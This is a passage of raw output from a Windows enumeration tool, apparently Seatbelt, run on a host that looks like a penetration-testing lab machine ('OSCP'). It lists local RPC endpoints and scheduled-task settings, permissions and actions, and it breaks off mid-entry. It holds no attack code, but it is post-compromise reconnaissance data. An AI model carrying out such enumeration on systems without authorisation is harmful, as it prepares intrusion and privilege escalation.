  3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0 (DHCPv6 Client LRPC Endpoint): ncalrpc:[dhcpcsvc6]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-a8720d846bbe5b450e]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (Network Connection Broker server endpoint for NCB Reset module): ncalrpc:[LRPC-a8720d846bbe5b450e]
  5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 (Network Connection Broker server endpoint for NCB Reset module): ncalrpc:[LRPC-46454d040f05028876]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-a8720d846bbe5b450e]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-46454d040f05028876]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[OLEAC927FB0AEDBEAD9DD6C98FBBF63]
  880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 (KAPI Service endpoint): ncalrpc:[LRPC-00f84d078d208fcf61]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-a8720d846bbe5b450e]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-46454d040f05028876]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[OLEAC927FB0AEDBEAD9DD6C98FBBF63]
  e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 (Network Connection Broker server endpoint): ncalrpc:[LRPC-00f84d078d208fcf61]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-fb0cb87a24647ecbdf]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-fb0cb87a24647ecbdf]
  a500d4c6-0dd1-4543-bc0c-d5f93486eaf8 v1.0 (): ncalrpc:[LRPC-97b333a82413db72be]
  7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 (NSI server endpoint): ncalrpc:[LRPC-a78cd648ed8db80b59]
  c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 (Impl friendly name): ncalrpc:[LRPC-04f03ce7f472a43cc4]
  4bec6bb8-b5c2-4b6f-b2c1-5da5cf92d0d9 v1.0 (): ncalrpc:[umpo]
  085b0334-e454-4d91-9b8c-4134f9e793f3 v1.0 (): ncalrpc:[umpo]
  8782d3b9-ebbd-4644-a3d8-e8725381919b v1.0 (): ncalrpc:[umpo]
  3b338d89-6cfa-44b8-847e-531531bc9992 v1.0 (): ncalrpc:[umpo]
  bdaa0970-413b-4a3e-9e5d-f6dc9d7e0760 v1.0 (): ncalrpc:[umpo]
  5824833b-3c1a-4ad2-bdfd-c31d19e23ed2 v1.0 (): ncalrpc:[umpo]
  0361ae94-0316-4c6c-8ad8-c594375800e2 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[umpo]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[actkernel]
  2d98a740-581d-41b9-aa0d-a88b9d5ce938 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[umpo]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[actkernel]
  8bfc3be1-6def-4e2d-af74-7c47cd0ade4a v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[umpo]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[actkernel]
  1b37ca91-76b1-4f5e-a3c7-2abfc61f2bb0 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[umpo]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[actkernel]
  c605f9fb-f0a3-4e2a-a073-73560f8d9e3e v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[umpo]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[actkernel]
  0d3e2735-cea0-4ecc-a9e2-41a2d81aed4e v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[umpo]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[actkernel]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  2513bcbe-6cd4-4348-855e-7efb3c336dd3 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[umpo]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[actkernel]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  20c40295-8dba-48e6-aebf-3e78ef3bb144 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[umpo]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[actkernel]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  b8cadbaf-e84b-46b9-84f2-6f71c03f9e55 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[umpo]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[actkernel]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  857fb1be-084f-4fb5-b59c-4b2c4be5f0cf v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[umpo]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[actkernel]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  55e6b932-1979-45d6-90c5-7f6270724112 v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[umpo]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[actkernel]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  76c217bc-c8b4-4201-a745-373ad9032b1a v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[umpo]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[actkernel]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  88abcbc3-34ea-76ae-8215-767520655a23 v0.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  2c7fd9ce-e706-4b40-b412-953107ef9bb0 v0.0 (): ncalrpc:[umpo]
  c521facf-09a9-42c5-b155-72388595cbf0 v0.0 (): ncalrpc:[umpo]
  1832bcf6-cab8-41d4-85d2-c9410764f75a v1.0 (): ncalrpc:[umpo]
  4dace966-a243-4450-ae3f-9b7bcb5315b8 v2.0 (): ncalrpc:[umpo]
  178d84be-9291-4994-82c6-3f909aca5a03 v1.0 (): ncalrpc:[umpo]
  e53d94ca-7464-4839-b044-09a2fb8b3ae5 v1.0 (): ncalrpc:[umpo]
  fae436b0-b864-4a87-9eda-298547cd82f2 v1.0 (): ncalrpc:[umpo]
  082a3471-31b6-422a-b931-a54401960c62 v1.0 (): ncalrpc:[umpo]
  6982a06e-5fe2-46b1-b39c-a2c545bfa069 v1.0 (): ncalrpc:[umpo]
  0ff1f646-13bb-400a-ab50-9a78f2b7a85a v1.0 (): ncalrpc:[umpo]
  4ed8abcc-f1e2-438b-981f-bb0e8abc010c v1.0 (): ncalrpc:[umpo]
  95406f0b-b239-4318-91bb-cea3a46ff0dc v1.0 (): ncalrpc:[umpo]
  0d47017b-b33b-46ad-9e18-fe96456c5078 v1.0 (): ncalrpc:[umpo]
  dd59071b-3215-4c59-8481-972edadc0f6a v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e614b5c184e4847ff6]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[umpo]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[actkernel]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-e614b5c184e4847ff6]
  9b008953-f195-4bf9-bde0-4471971e58ed v1.0 (): ncalrpc:[LRPC-bcfb9fb414e18484c5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e614b5c184e4847ff6]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-bcfb9fb414e18484c5]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[umpo]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[actkernel]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-e614b5c184e4847ff6]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-bcfb9fb414e18484c5]
  697dcda9-3ba9-4eb2-9247-e11f1901b0d2 v1.0 (): ncalrpc:[LRPC-805c00f8ec99b5753f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[umpo]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[actkernel]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-e614b5c184e4847ff6]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-bcfb9fb414e18484c5]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[LRPC-805c00f8ec99b5753f]
  d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[umpo]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[actkernel]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-00a762fda3084a2c0f]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[OLE2DD490EDE0565EB838EC3E061AFB]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-ee24a132946c1e2b08]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-88633da1ab58be4841]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-e614b5c184e4847ff6]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-bcfb9fb414e18484c5]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-805c00f8ec99b5753f]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[dabrpc]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc082E20]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WMsgKRpc082E20]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WindowsShutdown]
====== SCCM ======

  Server                         : 
  SiteCode                       : 
  ProductVersion                 : 
  LastSuccessfulInstallParams    : 

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   User_Feed_Synchronization-{BFA91971-B9FD-4F37-869A-BE90067E638A}
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Network
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   b.martin
  Author                            :   OSCP\b.martin
  Description                       :   Updates out-of-date system feeds.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   sync
      Execute                       :   C:\Windows\system32\msfeedssync.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2026-02-22T15:00:22-08:00
      EndBoundary                   :   2036-02-22T15:00:22-08:00
      StopAtDurationEnd             :   False
      DaysInterval                  :   1
      ------------------------------

  Name                              :   Server Initial Configuration Task
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%systemroot%\system32\SrvInitConfig.exe,-100)
  Description                       :   $(@%systemroot%\system32\SrvInitConfig.exe,-101)
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /disableconfigtask
      Execute                       :   %windir%\system32\srvinitconfig.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {84F0FAE1-C27B-4F6F-807B-28CF6F96287D}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {429BC048-379E-45E0-80E4-EB1977941B5C}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64 Critical
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {613FBA38-A3DF-4AB8-9674-5604984A299A}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 Critical
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DE434264-8FE9-4C0B-A83B-89EBEEBFF78E}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ProgramDataUpdater
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\invagent.dll,-701)
  Description                       :   $(@%SystemRoot%\system32\invagent.dll,-702)
  Source                            :   $(@%SystemRoot%\system32\invagent.dll,-701)
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -maintenance
      Execute                       :   %windir%\system32\compattelrunner.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Pre-staged app cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
      Execute                       :   %windir%\system32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1H
      ------------------------------

  Name                              :   BitLocker Encrypt All Drives
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerEncryptAllDrives
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   BitLocker MDM policy Refresh
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SyspartRepair
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FR;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir% /sysrepair
      Execute                       :   %windir%\system32\bcdboot.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   CreateObjectTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {E4544ABA-62BF-4C54-AAB2-EC246342626C}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Device
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   P4D
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\devicecensus.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2008-09-01T03:00:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT2H
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   DXGIAdapterCache
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
